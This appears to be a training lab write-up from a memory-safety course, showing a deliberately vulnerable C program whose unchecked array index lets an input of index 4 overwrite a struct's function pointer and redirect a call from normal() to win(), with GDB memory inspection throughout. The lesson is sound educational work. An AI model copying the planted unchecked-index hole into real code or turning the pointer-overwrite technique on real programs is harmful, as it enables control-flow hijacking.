# Challenge 04 — Controlled Control Flow

## Objective

Challenge 04 demonstrates how an out-of-bounds memory write can affect **program control flow**.

Previous challenges demonstrated that accessing memory outside an array can corrupt nearby data. In this challenge, the adjacent data is a **function pointer**.

The goal is to observe the complete progression:

    unchecked array index
            ↓
    out-of-bounds write
            ↓
    function pointer corruption
            ↓
    indirect function call
            ↓
    control flow redirected

The challenge remains entirely inside the deliberately vulnerable local program.

Rather than executing injected code, the experiment redirects execution from one existing function in the program, `normal()`, to another existing function, `win()`.

---

## Prerequisites

Before beginning this challenge, you should be familiar with the concepts covered in the previous challenges:

- C arrays and array indexing
- pointers and addresses
- stack memory
- out-of-bounds memory access
- undefined behavior
- inspecting memory with GDB
- hexadecimal values
- basic stack corruption

Challenge 04 introduces:

- function pointers
- indirect function calls
- structures and member layout
- pointer-sized values
- little-endian representation
- corruption of control-flow data

---

## Source Code

`challenge04/challenge04.c`

~~~c
#include <stdio.h>

void normal(void)
{
    printf("Normal function executed.\n");
}

void win(void)
{
    printf("SUCCESS: control flow reached win().\n");
}

struct Challenge
{
    int buffer[4];
    void (*function_ptr)(void);
};

int main(void)
{
    struct Challenge challenge;
    int index;
    unsigned int value;

    challenge.function_ptr = normal;

    challenge.buffer[0] = 1;
    challenge.buffer[1] = 2;
    challenge.buffer[2] = 3;
    challenge.buffer[3] = 4;

    printf("buffer:        %p\n", (void *)challenge.buffer);
    printf("function_ptr:  %p\n", (void *)&challenge.function_ptr);
    printf("normal:        %p\n", (void *)normal);
    printf("win:           %p\n", (void *)win);

    printf("\nIndex: ");
    scanf("%d", &index);

    printf("Value (hex): ");
    scanf("%x", &value);

    /*
     * Intentionally vulnerable:
     * index is not checked before accessing buffer.
     */
    challenge.buffer[index] = value;

    printf("\nCalling function pointer...\n");

    challenge.function_ptr();

    return 0;
}
~~~

---

## Understanding the Structure

The challenge places an array and a function pointer inside the same structure:

~~~c
struct Challenge
{
    int buffer[4];
    void (*function_ptr)(void);
};
~~~

The array contains four integers:

~~~text
buffer[0]
buffer[1]
buffer[2]
buffer[3]
~~~

The only valid indexes are therefore:

~~~text
0
1
2
3
~~~

The function pointer follows the array in the structure.

Conceptually:

~~~text
struct Challenge

+----------------------+
| buffer[0]            | 4 bytes
+----------------------+
| buffer[1]            | 4 bytes
+----------------------+
| buffer[2]            | 4 bytes
+----------------------+
| buffer[3]            | 4 bytes
+----------------------+
| function_ptr         | 8 bytes
+----------------------+
~~~

The exact layout must still be verified rather than assumed because C object layout can include padding and can vary between platforms and builds.

---

## Building the Challenge

From the repository root:

~~~bash
make
~~~

The executable is created at:

~~~text
bin/challenge04
~~~

Run it normally with:

~~~bash
./bin/challenge04
~~~

Start it under GDB with:

~~~bash
make debug04
~~~

---

# Part 1 — Inspecting the Structure

Before introducing the vulnerable write, the structure layout was examined with GDB.

The observed addresses were:

~~~text
&challenge.buffer[0]       0x7fffffffd4a0
&challenge.buffer[1]       0x7fffffffd4a4
&challenge.buffer[2]       0x7fffffffd4a8
&challenge.buffer[3]       0x7fffffffd4ac
&challenge.function_ptr    0x7fffffffd4b0
~~~

Each `int` occupies four bytes, so the array elements are four bytes apart.

The sizes were examined with:

~~~gdb
print sizeof(challenge.buffer)
print sizeof(challenge.function_ptr)
print sizeof(challenge)
~~~

The observed results were:

~~~text
sizeof(challenge.buffer)       = 16
sizeof(challenge.function_ptr) = 8
sizeof(challenge)              = 24
~~~

Therefore, in this build, the structure layout was:

~~~text
Offset    Object
------    ---------------------
+0        buffer[0]
+4        buffer[1]
+8        buffer[2]
+12       buffer[3]
+16       function_ptr
+24       end of structure
~~~

There was no padding between `buffer` and `function_ptr` in this build.

---

# Part 2 — Examining Raw Memory

The structure was examined as 32-bit words:

~~~gdb
x/8wx &challenge
~~~

Before initialization had executed, the observed memory was:

~~~text
0x7fffffffd4a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x7fffffffd4b0: 0x00000000  0x00000000  0x00000000  0x00000000
~~~

It was also examined as 64-bit values:

~~~gdb
x/4gx &challenge
~~~

which showed:

~~~text
0x7fffffffd4a0: 0x0000000000000000  0x0000000000000000
0x7fffffffd4b0: 0x0000000000000000  0x0000000000000000
~~~

As in the previous challenges, an important GDB rule applies:

> When GDB stops on a source line, the statement displayed on that line normally has not executed yet.

Memory should therefore be interpreted according to where execution has actually stopped.

---

# Part 3 — Function Pointers

The structure contains:

~~~c
void (*function_ptr)(void);
~~~

This declares `function_ptr` as a pointer to a function that:

- takes no arguments
- returns `void`

The program initially assigns:

~~~c
challenge.function_ptr = normal;
~~~

Later it performs an indirect function call:

~~~c
challenge.function_ptr();
~~~

Normally this causes:

~~~c
normal();
~~~

to execute.

The program contains another function:

~~~c
void win(void)
{
    printf("SUCCESS: control flow reached win().\n");
}
~~~

The goal of the challenge is to demonstrate how corruption of the function pointer can cause this indirect call to reach `win()` instead.

---

# Part 4 — Creating the Vulnerability

The program accepts an array index from the user:

~~~c
scanf("%d", &index);
~~~

and a hexadecimal value:

~~~c
scanf("%x", &value);
~~~

It then performs:

~~~c
challenge.buffer[index] = value;
~~~

The vulnerability is that the program never verifies that:

~~~text
0 <= index <= 3
~~~

An index outside that range produces an out-of-bounds array access and therefore invokes **undefined behavior**.

For example:

~~~text
buffer[4]
~~~

is outside the array.

---

# Part 5 — Discovering What Follows the Array

The addresses immediately following the valid array were inspected:

~~~gdb
print (void *)&challenge.buffer[4]
print (void *)&challenge.buffer[5]
print (void *)&challenge.function_ptr
~~~

The observed results were:

~~~text
&challenge.buffer[4]       0x7fffffffd4b0
&challenge.buffer[5]       0x7fffffffd4b4
&challenge.function_ptr    0x7fffffffd4b0
~~~

Therefore, in this particular build:

~~~text
&challenge.buffer[4] == &challenge.function_ptr
~~~

as raw addresses.

The relationship was:

~~~text
0x7fffffffd4a0    buffer[0]
0x7fffffffd4a4    buffer[1]
0x7fffffffd4a8    buffer[2]
0x7fffffffd4ac    buffer[3]

0x7fffffffd4b0    buffer[4]  <-- invalid index
                  function_ptr begins here

0x7fffffffd4b4    buffer[5]  <-- invalid index
                  second half of function_ptr
~~~

This is the critical relationship in Challenge 04.

---

# Part 6 — Why the Pointer Occupies Two Array-Sized Locations

On this x86-64 environment:

~~~text
sizeof(int)              = 4 bytes
sizeof(function pointer) = 8 bytes
~~~

Therefore, one out-of-bounds `int` write modifies four bytes, while the function pointer occupies eight bytes.

The pointer can be examined as two 32-bit words:

~~~gdb
x/2wx &challenge.function_ptr
~~~

In the observed run, the function addresses were:

~~~text
normal = 0x5555555551a9
win    = 0x5555555551c3
~~~

The initial function pointer was:

~~~text
0x00005555555551a9
~~~

Examining those same eight bytes as two 32-bit words showed:

~~~text
0x555551a9  0x00005555
~~~

On the little-endian x86-64 system used for this lab, the lower-addressed four bytes contain the low 32 bits of the pointer.

Therefore:

~~~text
function_ptr = 0x00005555555551a9

low  32 bits = 0x555551a9
high 32 bits = 0x00005555
~~~

The address of `win()` was:

~~~text
0x00005555555551c3
~~~

which can be separated into:

~~~text
low  32 bits = 0x555551c3
high 32 bits = 0x00005555
~~~

Notice that the high 32 bits are identical.

Only the low 32 bits differ.

---

# Part 7 — Setting the Breakpoint

The vulnerable assignment was on line 47:

~~~c
challenge.buffer[index] = value;
~~~

A breakpoint was placed directly on that line:

~~~gdb
break 47
run
~~~

The program displayed:

~~~text
buffer:        0x7fffffffd4a0
function_ptr:  0x7fffffffd4b0
normal:        0x5555555551a9
win:           0x5555555551c3

Index:
~~~

For this specific run, the following input was used:

~~~text
Index: 4
Value (hex): 555551c3
~~~

GDB then stopped at:

~~~text
Breakpoint 1, main () at challenge04/challenge04.c:47
47          challenge.buffer[index] = value;
~~~

At this point, line 47 had not yet executed.

---

# Part 8 — Inspecting the Pointer Before the Write

Before executing the vulnerable statement:

~~~gdb
print challenge.function_ptr
~~~

showed:

~~~text
(void (*)(void)) 0x5555555551a9 <normal>
~~~

Raw memory was examined with:

~~~gdb
x/2wx &challenge.function_ptr
~~~

and showed:

~~~text
0x7fffffffd4b0: 0x555551a9  0x00005555
~~~

Therefore the function pointer still contained:

~~~text
0x00005555555551a9
~~~

which was the address of:

~~~text
normal()
~~~

---

# Part 9 — Executing the Vulnerable Write

The vulnerable statement was executed with:

~~~gdb
next
~~~

GDB advanced to:

~~~text
49          printf("\nCalling function pointer...\n");
~~~

This confirmed that line 47 had executed.

The function pointer was examined again:

~~~gdb
print challenge.function_ptr
~~~

The result was:

~~~text
(void (*)(void)) 0x5555555551c3 <win>
~~~

Examining the raw memory:

~~~gdb
x/2wx &challenge.function_ptr
~~~

showed:

~~~text
0x7fffffffd4b0: 0x555551c3  0x00005555
~~~

Comparing the memory before and after:

~~~text
Before:

0x555551a9  0x00005555

After:

0x555551c3  0x00005555
~~~

Only the low four bytes changed.

The complete pointer therefore changed from:

~~~text
0x00005555555551a9
~~~

to:

~~~text
0x00005555555551c3
~~~

or, symbolically:

~~~text
normal()
   ↓
win()
~~~

---

# Part 10 — Redirecting Control Flow

After confirming the pointer corruption, execution continued:

~~~gdb
continue
~~~

The program reached:

~~~c
challenge.function_ptr();
~~~

Because `function_ptr` no longer contained the address of `normal()`, the indirect call did not execute the originally intended function.

Instead, the program printed:

~~~text
Calling function pointer...
SUCCESS: control flow reached win().
~~~

GDB then reported:

~~~text
[Inferior 1 (process 273709) exited normally]
~~~

The program did not crash.

Instead, its execution path was changed.

---

# What Happened?

The complete sequence was:

~~~text
User supplies index 4
        ↓
Program performs:
challenge.buffer[4] = value
        ↓
buffer[4] is outside the valid array
        ↓
In this build, buffer[4] overlaps function_ptr
        ↓
Four bytes of function_ptr are overwritten
        ↓
function_ptr changes from normal() to win()
        ↓
Program executes:
challenge.function_ptr()
        ↓
Indirect call follows the corrupted pointer
        ↓
win() executes
~~~

This is a significant progression from merely corrupting ordinary data.

---

# Comparison With Previous Challenges

## Challenge 01

Challenge 01 introduced normal stack behavior:

~~~text
variables
pointers
addresses
stack frames
saved return addresses
~~~

No vulnerability was required.

## Challenge 02

Challenge 02 introduced an out-of-bounds array write:

~~~text
array
    ↓
invalid index
    ↓
memory outside array modified
~~~

The primary lesson was that C does not automatically prevent an ordinary array access from going outside its bounds.

## Challenge 03

Challenge 03 demonstrated corruption of meaningful program data:

~~~text
buffer[-1]
    ↓
target
    ↓
target changes from 0x12345678
to 0x41414141
~~~

The corrupted value was ordinary data.

## Challenge 04

Challenge 04 changes the significance of the corrupted object:

~~~text
buffer[4]
    ↓
function_ptr
    ↓
control-flow data changes
    ↓
indirect function call changes destination
~~~

This connects memory corruption directly to program control flow.

---

# Why the Program Did Not Crash

A memory corruption bug does not necessarily cause a crash.

In this experiment, the corrupted function pointer contained the valid address of another function already present in the program.

Therefore:

~~~c
challenge.function_ptr();
~~~

still represented a valid indirect call.

It simply called a different function than originally intended.

This demonstrates why:

~~~text
"the program did not crash"
~~~

does not mean:

~~~text
"the memory access was safe"
~~~

Undefined behavior can manifest in many ways, including apparently successful execution.

---

# Undefined Behavior

The expression:

~~~c
challenge.buffer[4]
~~~

is outside the bounds of:

~~~c
int buffer[4];
~~~

The only valid indexes are:

~~~text
0
1
2
3
~~~

Therefore the program invokes undefined behavior when it accesses `buffer[4]`.

The fact that the experiment behaved predictably in this particular build does **not** make the operation valid C.

Different:

- compilers
- optimization levels
- architectures
- compiler versions
- structure layouts
- build options

can produce different behavior.

The lab therefore verifies actual memory relationships with GDB instead of assuming them.

---

# ASLR and Address Changes

The absolute addresses observed during this challenge are not universal constants.

For example:

~~~text
normal = 0x5555555551a9
win    = 0x5555555551c3
~~~

These values came from one particular build and execution environment.

Addresses can change because of mechanisms such as address-space layout randomization and position-independent executables.

The important lesson is therefore not to memorize:

~~~text
0x5555555551c3
~~~

The important lesson is the relationship:

~~~text
buffer ends
    ↓
function pointer follows
    ↓
unchecked indexing reaches pointer
    ↓
pointer controls an indirect call
~~~

Addresses should always be measured for the current experiment.

---

# GDB Commands Used

Useful commands from this challenge included:

~~~gdb
break 47
run

print &challenge.buffer[0]
print &challenge.buffer[1]
print &challenge.buffer[2]
print &challenge.buffer[3]

print &challenge.function_ptr

print sizeof(challenge.buffer)
print sizeof(challenge.function_ptr)
print sizeof(challenge)

x/8wx &challenge
x/4gx &challenge

print (void *)&challenge.buffer[4]
print (void *)&challenge.buffer[5]
print (void *)&challenge.function_ptr

print normal
print win
print challenge.function_ptr

x/2wx &challenge.function_ptr

print index
print/x value

next
continue
~~~

---

# Understanding the GDB `x` Formats

Two memory formats were particularly useful.

## 32-bit words

~~~gdb
x/6wx &challenge
~~~

Here:

~~~text
x = examine memory
6 = display six values
w = word (4 bytes)
x = hexadecimal
~~~

This was useful because each array element is a four-byte `int`.

## 64-bit giant words

~~~gdb
x/3gx &challenge
~~~

Here:

~~~text
x = examine memory
3 = display three values
g = giant word (8 bytes)
x = hexadecimal
~~~

This was useful for viewing the complete 64-bit function pointer as a single value.

Using both views helped demonstrate how the same bytes can be interpreted at different widths.

---

# Key Concepts

After completing Challenge 04, the following concepts should be clear:

- A function pointer stores the address of executable code.
- Calling through a function pointer is an indirect control-flow operation.
- An unchecked array index can cause an out-of-bounds write.
- Out-of-bounds writes can modify nearby objects.
- A four-element array has valid indexes `0` through `3`.
- `buffer[4]` is outside the array even if memory happens to exist there.
- Structure layout can make different objects adjacent in memory.
- Object layout should be measured rather than blindly assumed.
- An `int` was four bytes in this environment.
- A function pointer was eight bytes in this x86-64 environment.
- A 64-bit value can be examined as two 32-bit words.
- x86-64 is little-endian in this environment.
- Corrupting control-flow data can change what code the program executes.
- Memory corruption does not need to cause a crash.
- Successful execution does not mean an out-of-bounds operation was valid.
- Out-of-bounds array access is undefined behavior.
- Absolute addresses can change between builds or executions.
- The important lesson is the relationship between objects, not a particular address.

---

# Completion Checklist

Challenge 04 is complete when you can explain why each of the following is true:

- [ ] `buffer` contains four integers.
- [ ] The valid indexes are `0` through `3`.
- [ ] `buffer[4]` is an out-of-bounds access.
- [ ] `buffer` occupied 16 bytes in this environment.
- [ ] `function_ptr` occupied 8 bytes.
- [ ] The complete structure occupied 24 bytes.
- [ ] GDB showed `function_ptr` immediately after `buffer` in this build.
- [ ] `&buffer[4]` had the same raw address as `&function_ptr`.
- [ ] `buffer[4]` overlapped the low four bytes of the function pointer in this little-endian build.
- [ ] `function_ptr` initially pointed to `normal()`.
- [ ] The vulnerable write changed the low 32 bits of the pointer.
- [ ] After the write, GDB resolved `function_ptr` to `win()`.
- [ ] The indirect function call subsequently executed `win()`.
- [ ] The program exited normally rather than crashing.
- [ ] The out-of-bounds operation was still undefined behavior.
- [ ] The observed absolute addresses should not be assumed to remain constant.

---

# Takeaway

Challenge 04 demonstrates an important transition in understanding memory corruption.

In Challenge 03, an out-of-bounds write modified ordinary program data:

~~~text
memory corruption
    ↓
data corruption
~~~

In Challenge 04, an out-of-bounds write modified a value used to determine where the program executes next:

~~~text
memory corruption
    ↓
control-flow data corruption
    ↓
changed execution path
~~~

The experiment demonstrates why memory-safety bugs can become security vulnerabilities.

The program intended to execute:

~~~c
normal();
~~~

through its function pointer.

Instead, an unchecked array index allowed memory outside the array to be modified. Because the adjacent memory contained the function pointer, that pointer was changed to the address of `win()`.

The subsequent indirect call then followed the corrupted pointer and executed `win()`.

The central lesson is:

> Memory corruption becomes especially significant when the corrupted memory influences program control flow.

Challenge 04 therefore connects the memory-layout concepts from the previous challenges with the fundamental security concept of **control-flow corruption**.